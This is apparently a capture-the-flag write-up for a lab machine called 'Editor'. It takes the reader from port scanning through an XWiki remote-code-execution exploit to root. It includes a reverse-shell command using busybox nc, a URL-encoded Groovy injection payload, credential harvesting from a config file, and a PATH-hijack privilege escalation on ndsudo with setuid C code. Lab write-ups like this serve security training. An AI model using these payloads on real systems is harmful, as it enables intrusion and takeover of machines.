## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Target IP Address
10.10.11.80
Machine Information
Services may take up to 5 minutes to load.
```

## IP -Address
```IP-Address
10.10.11.80
```

## RustScan 
```bash
$ rustscan -a 10.10.11.80 -b 450 -t 2000 --ulimit 5000 -- -e tun0  -p80
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.80:22
Open 10.10.11.80:80
Open 10.10.11.80:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -e tun0 -p80" on ip 10.10.11.80
Depending on the complexity of the script, results may take some time to appear.
[!] Error Exit code = 1
```

## Nmap
```bash
$ nmap -A 10.10.11.80                              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 09:58 EDT
Nmap scan report for 10.10.11.80
Host is up (0.62s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Jetty(10.0.20)
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   706.11 ms 10.10.16.1
2   334.86 ms 10.10.11.80

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.51 seconds
```

## /etc/hosts
```bash
sudo echo "10.10.11.80  editor.htb" >> /etc/hosts
```

## Nmap -Port 8080
```bash $ nmap -sV -sC -Pn 10.10.11.80 -p 8080
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 11:25 EDT
Nmap scan report for editor.htb (10.10.11.80)
Host is up (0.38s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 10.0.20
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Jetty(10.0.20)
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Jetty(10.0.20)
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.70 seconds
```

Got a Hint 
```link 
http://editor.htb:8080/xwiki/bin/view/Main/
```

## Browser
```bash
Information about Intro
Last modified by Neal Bagwell on 2025/06/16 09:39
Locale
English
Syntax
XWiki 2.1
Hidden
No
Included pages
No included pages
Backlinks
No backlinks
Page reference
Main.WebHome

XWiki Debian 15.10.8
```

Got Debian XWiki Version
```version
XWiki Debian 15.10.8
```

## ExploitDB
```ExploitDB
https://www.exploit-db.com/exploits/52136
In his description got the Github Repo
https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py
https://github.com/gunzf0x/CVE-2025-24893
```

Clone This repo
```bash
$ git clone https://github.com/gunzf0x/CVE-2025-24893
```

## Reverse - Shell
```bash
$ cd CVE-2025-24893 
┌──(kali㉿kali)-[~/CVE-2025-24893]
└─$ ls
CVE-2025-24893.py  README.md
$ python3 CVE-2025-24893.py -t http://editor.htb:8080/ -c 'busybox nc 10.10.16.73 4444 -e /bin/bash'
[*] Attacking http://editor.htb:8080/
[*] Injecting the payload:
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.16.73%204444%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D                
[*] Command executed
~Happy Hacking

$ nc -lvnp 4444
whoami
xwiki
```

## Explore The Machine
```bash
cd /usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF
```
Got the File Which Contains the credentials of the user oliver
#### File
```bash
lrwxrwxrwx 1 root root     28 Mar 27  2024 hibernate.cfg.xml -> /etc/xwiki/hibernate.cfg.xml
```
## SSH Credentials
```Credentials
cat hibernate.cfg.xml | grep hibernate.connection.username
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.username">sa</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.username">sa</property>
cat hibernate.cfg.xml | grep password
    <property name="hibernate.connection.password">[password omitted]</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
```

## User 
```bash
$ ssh oliver@editor.htb
Password: [password omitted]
oliver@editor:~$ ls
linpeas.sh  nvme  user.txt
oliver@editor:~$ cat user.txt
[flag omitted]
oliver@editor:~$ 
```
###  User Flag
```Flag
[flag omitted]
```

## Privilege Escalation
```bash
$ find / -type f -perm -4000 -user root 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```
## Vulnerability
```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

which can be run by the group which is `netdata` and `oliver` is the part of this group
```bash
/usr/libexec/polkit-agent-helper-1
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```
#CVE-2024-32019 
```Github_Repo
 https://github.com/AzureADTrent/CVE-2024-32019-POC
```
## Local Machine
```bash
$ nano exploit.c  
┌──(kali㉿kali)-[~]
└─$ ls
BurpSuite       Desktop    Downloads  Hackfinity  Pictures  Rooms      Videos
CVE-2025-24893  Documents  exploit.c  Music       Public    Templates  VPN
└─$ gcc exploit.c -o nvme
└─$ chmod +x nvme
```
## File
```C
#include <unistd.h>  
  
int main() {  
setuid(0); setgid(0);  
execl("/bin/bash", "bash", NULL);  
return 0;  
}
```
## Target Machine
```bash
scp nvme oliver@editor.htb:/tmp
```
this will copy the `nvme` file and share with the Target Machine into the `tmp` directory
## Root
```bash
oliver@editor:~$ scp nvme oliver@editor.htb:/tmp
oliver@editor.htb's password: 
nvme                                                                          100% 16KB  20.1MB/s   00:00    
oliver@editor:~$ cd /tmp
oliver@editor:/tmp$ chmod +x nvme
oliver@editor:/tmp$ export PATH=/tmp:$PATH
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
root@editor:/tmp# whoami
root
root@editor:/tmp# ls /root
root.txt  scripts  snap
root@editor:/tmp# cat /root/root.txt
[flag omitted]
```
#### Root Flag
```Flag
[flag omitted]
```